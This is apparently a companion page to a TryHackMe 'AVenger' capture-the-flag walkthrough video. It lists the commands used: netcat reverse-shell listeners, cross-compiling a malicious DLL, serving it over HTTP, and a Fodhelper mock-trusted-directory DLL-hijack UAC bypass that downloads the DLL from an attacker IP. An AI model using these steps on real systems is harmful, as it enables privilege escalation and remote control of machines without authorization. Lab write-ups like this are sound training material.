## TryHackMe room AVenger https://tryhackme.com/room/avenger

### TryHackMe AVenger YouTube Video Walk Through: 

[TryHackMe AVenger  | Full Walkthro - Full Walkthrough 2025](https://youtu.be/SlVZ8KgnaNI)

**Below commands used on TryHackMe room AVenger YouTube video walk through:**

```
rlwrap nc -lvnp 4444
```

```
apt install gcc-mingw-w64-x86-64-win32

```

```
x86_64-w64-mingw32-gcc -shared -o morph.dll evil.c

```

```
python3 -m http.server

```

```
rlwrap nc -lvnp 5555
```


```
cmd /c mkdir "C:\Windows \"
cmd /c mkdir "C:\Windows \System32\"

cmd /c copy "C:\Windows\System32\Fodhelper.exe" "C:\Windows \System32\Fodhelper.exe"

curl http://10.114.87.130:8000/morph.dll -o "C:\Windows \System32\Secur32.dll"

cmd /c "C:\Windows \System32\Fodhelper.exe"

```

